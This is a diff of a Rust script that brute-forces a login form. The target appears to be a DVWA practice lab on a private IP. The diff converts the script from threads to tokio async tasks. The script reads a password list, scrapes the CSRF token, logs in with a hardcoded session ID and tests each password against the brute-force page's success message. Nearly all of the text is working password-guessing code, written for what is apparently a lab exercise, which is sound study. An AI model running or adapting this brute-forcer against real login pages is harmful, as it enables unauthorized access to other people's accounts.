@@ -1,5 +1,5 @@
 use reqwest::header::{COOKIE, HeaderMap, HeaderValue};
-use std::thread;
+use std::convert::Infallible;
 use std::time::Duration;
 use std::{
     error::Error,
@@ -7,6 +7,7 @@ use std::{
     io::Read,
     sync::{Arc, Mutex},
 };
+use tokio::task;
 
 const URL: &'static str = "http://10.164.2.70/vulnerabilities/brute/";
 const PHPSESSID: &'static str = "vvcu6frrcr0v2mbuu1hdrulrpr"; // Replace with your actual PHPSESSID
@@ -25,9 +26,8 @@ fn read_passwords(filename: &'static str) -> Vec<String> {
         .collect()
 }
 
-fn extract_phpsessid(response: &reqwest::blocking::Response) -> String {
+fn extract_phpsessid(response: &reqwest::Response) -> String {
     let cookies = response.headers().get_all(reqwest::header::SET_COOKIE);
-    println!("RESPONSE: {:?}", response);
     let mut phpsessid = None;
     for cookie in cookies {
         if let Ok(cookie_str) = cookie.to_str() {
@@ -47,26 +47,15 @@ fn extract_phpsessid(response: &reqwest::blocking::Response) -> String {
     phpsessid.expect("No php session id in response")
 }
 
-fn try_password(
-    client: &reqwest::blocking::Client,
-    password: &str,
-    counter: &Arc<Mutex<usize>>,
-    total_passwords: usize,
-    thread_id: usize,
-) -> Result<Option<String>, Box<dyn Error + Send + Sync>> {
-    {
-        let mut count = counter.lock().unwrap();
-        *count += 1;
-        if *count % 1 == 0 {
-            println!("Tried {}/{} passwords", *count, total_passwords);
-        }
-    }
-
-    let login_page_response = client.get("http://10.164.2.70/login.php").send()?;
+async fn try_password(
+    client: &reqwest::Client,
+    password: String,
+)-> Result<(), Box<dyn Error + Send + Sync>> {
+    let login_page_response = client.get("http://10.164.2.70/login.php").send().await?;
 
     let phpsessid = extract_phpsessid(&login_page_response);
 
-    let login_page_text = login_page_response.text()?;
+    let login_page_text = login_page_response.text().await?;
 
     let user_token = {
         let document = scraper::Html::parse_document(&login_page_text);
@@ -90,7 +79,7 @@ fn try_password(
             ("Login", "Login"),
             ("user_token", &user_token)
         ])
-        .send()?;
+        .send().await?;
 
     // let phpsessid = extract_phpsessid(&response);
     println!("using session id: {}", phpsessid);
@@ -110,26 +99,35 @@ fn try_password(
     );
     println!("trying: {}, {}", USERNAME, password);
 
-    let response = client
-        .get(&payload)
-        .headers(headers)
-        // .timeout(Duration::from_millis(50))
-        .send()?;
+    let client_clone = client.clone();
+    let password = password.clone();
+    tokio::spawn(async move {
+        let response = client_clone
+            .get(&payload)
+            .headers(headers)
+            // .timeout(Duration::from_millis(50))
+            .send().await?;
 
-    let response_text = response.text()?;
+        let response_text = response.text().await?;
 
-    // Check if login was successful
-    if response_text.contains("Welcome to the password protected area") {
-        println!("Thread {} found password: {}", thread_id, password);
-        return Ok(Some(password.to_string()));
-    }
-    else if response_text.contains("Username and/or password incorrect.") {
-        return Ok(None);
-    }
-    panic!("Login failed, password neither incorrect nor correct");
+        // Check if login was successful
+        if response_text.contains("Welcome to the password protected area") {
+            println!("Found password: {}", password);
+            std::process::abort();
+            return Ok(Some(password.to_string()));
+        }
+        else if response_text.contains("Username and/or password incorrect.") {
+            return Ok(None);
+        }
+        // panic!("Login failed, password neither incorrect nor correct");
+
+        Ok::<Option<String>, Box<dyn Error + Send + Sync>>(None)
+    });
+    Ok(())
 }
 
-pub fn run() -> Result<(), Box<dyn Error>> {
+#[tokio::main]
+pub async fn run() -> Result<(), Box<dyn Error>> {
     let passwords = read_passwords("passwords/other.txt");
     let total_passwords = passwords.len();
     let counter = Arc::new(Mutex::new(0));
@@ -140,69 +138,16 @@ pub fn run() -> Result<(), Box<dyn Error>> {
     );
 
     // Split passwords into chunks for each thread
-    let chunk_size = (total_passwords + THREADS - 1) / THREADS; // Ceiling division
-    let password_chunks: Vec<Vec<String>> = passwords
-        .chunks(chunk_size)
-        .map(|chunk| chunk.to_vec())
-        .collect();
-
-    let mut handles = vec![];
-
-    // Spawn threads
-    for (thread_id, chunk) in password_chunks.into_iter().enumerate() {
-        let thread_counter = Arc::clone(&counter);
-
-        let handle = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
-            // Create a client for this thread
-            let client = reqwest::blocking::Client::builder()
-                .pool_idle_timeout(std::time::Duration::from_secs(30))
-                .build()?;
-
-            println!(
-                "Thread {} starting with {} passwords",
-                thread_id,
-                chunk.len()
-            );
-
-            for password in chunk {
-                // Try this password
-                match try_password(
-                    &client,
-                    &password,
-                    &thread_counter,
-                    total_passwords,
-                    thread_id,
-                ) {
-                    Ok(Some(found)) => {
-                        println!("Found password: {}", found);
-                        break;
-                    }
-                    Err(e) => println!("{:?}", e),
-                    _ => continue,
-                }
-                // if let Some(found) = try_password(
-                //     &client,
-                //     &password,
-                //     &thread_counter,
-                //     total_passwords,
-                //     thread_id,
-                // )? {
-                //     println!("Found password: {}", found);
-                //     break;
-                // }
-            }
-
-            println!("Thread {} completed", thread_id);
-            Ok(())
-        });
-
-        handles.push(handle);
-    }
-
-    // Wait for all threads to complete
-    for (i, handle) in handles.into_iter().enumerate() {
-        if let Err(e) = handle.join().unwrap() {
-            println!("Thread {} error: {}", i, e);
+    let client = reqwest::Client::builder()
+        .pool_idle_timeout(std::time::Duration::from_secs(30))
+        .build()?;
+    for password in passwords {
+        match try_password(
+            &client,
+            password.clone(),
+        ).await {
+            Err(e) => println!("{:?}", e),
+            _ => continue,
         }
     }
 
